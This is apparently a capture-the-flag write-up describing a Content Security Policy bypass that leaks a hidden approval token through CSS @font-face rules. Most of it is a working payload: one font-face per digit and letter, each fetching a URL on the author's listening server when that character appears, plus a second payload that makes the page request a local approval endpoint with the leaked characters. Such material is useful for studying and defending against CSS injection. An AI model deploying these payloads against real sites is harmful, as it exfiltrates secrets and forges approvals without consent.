**CSP bypass via CSS font payload**
If a CSP is set to allow wildcard(*)  over fonts(font-src 'self' *;) then you can use the following css code to exfiltrate the hidden data.
In my case the challenge allowed to upload some custom css that get's rendered and my goal was to exfiltrate the approvaltoken that is accessible otherwise only from the localhost.

## Explanation of the payload:
It firstly unhide the paragraph that serves the token via Template engine (`<p id="approvalToken" class="d-none">{{ approvalToken }}</p>`)
As you see it hides via d-none and then it  ex-filtrates to our server if the char is available in the page.

## Payload
The payload will ex-filtrate all the chars/numbs that are present in the back-end page that is only accessible from the localhost. If the char exist, then it is sent back to my listening server.
This technique unfortunately is not ex-filtrating in order so you need to sort out how to puzzle it back.

```
 p.d-none {
        display: block !important;
    }
    
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?0); 
    unicode-range: U+0030;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?1); 
    unicode-range: U+0031;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?2); 
    unicode-range: U+0032;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?3); 
    unicode-range: U+0033;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?4); 
    unicode-range: U+0034;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?5); 
    unicode-range: U+0035;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?6); 
    unicode-range: U+0036;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?7); 
    unicode-range: U+0037;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?8); 
    unicode-range: U+0038;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?9); 
    unicode-range: U+0039;
}

/* Uppercase A-Z */
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?A); 
    unicode-range: U+0041;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?B); 
    unicode-range: U+0042;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?C); 
    unicode-range: U+0043;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?D); 
    unicode-range: U+0044;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?E); 
    unicode-range: U+0045;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?F); 
    unicode-range: U+0046;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?G); 
    unicode-range: U+0047;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?H); 
    unicode-range: U+0048;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?I); 
    unicode-range: U+0049;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?J); 
    unicode-range: U+004A;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?K); 
    unicode-range: U+004B;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?L); 
    unicode-range: U+004C;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?M); 
    unicode-range: U+004D;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?N); 
    unicode-range: U+004E;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?O); 
    unicode-range: U+004F;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?P); 
    unicode-range: U+0050;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?Q); 
    unicode-range: U+0051;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?R); 
    unicode-range: U+0052;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?S); 
    unicode-range: U+0053;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?T); 
    unicode-range: U+0054;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?U); 
    unicode-range: U+0055;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?V); 
    unicode-range: U+0056;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?W); 
    unicode-range: U+0057;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?X); 
    unicode-range: U+0058;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?Y); 
    unicode-range: U+0059;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?Z); 
    unicode-range: U+005A;
}

/* Lowercase a-z */
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?a); 
    unicode-range: U+0061;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?b); 
    unicode-range: U+0062;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?c); 
    unicode-range: U+0063;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?d); 
    unicode-range: U+0064;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?e); 
    unicode-range: U+0065;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?f); 
    unicode-range: U+0066;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?g); 
    unicode-range: U+0067;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?h); 
    unicode-range: U+0068;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?i); 
    unicode-range: U+0069;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?j); 
    unicode-range: U+006A;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?k); 
    unicode-range: U+006B;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?l); 
    unicode-range: U+006C;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?m); 
    unicode-range: U+006D;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?n); 
    unicode-range: U+006E;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?o); 
    unicode-range: U+006F;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?p); 
    unicode-range: U+0070;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?q); 
    unicode-range: U+0071;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?r); 
    unicode-range: U+0072;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?s); 
    unicode-range: U+0073;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?t); 
    unicode-range: U+0074;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?u); 
    unicode-range: U+0075;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?v); 
    unicode-range: U+0076;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?w); 
    unicode-range: U+0077;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?x); 
    unicode-range: U+0078;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?y); 
    unicode-range: U+0079;
}
@font-face{
    font-family: poc;
    src: url(http://172.17.0.1/?z); 
    unicode-range: U+007A;
}

#approvalToken{
    font-family: poc;
}
```

## Followup
The followup involves the approval via a SSRF that basically unhides the **approvaltoken**, and applies the payload to the **approvaltoken** class and indirectly it performs a SSRF to approve our task.
```
p.d-none {
    display: block !important;
}

@font-face {
    font-family: 'ApprovalFont';
    src: url('http://127.0.0.1:1337/approve/1/02347ACEHKMNRUVWXadfghjmpqstuxyz');
}

#approvalToken.d-none::before {
    content: '';
    font-family: 'ApprovalFont';
}

```
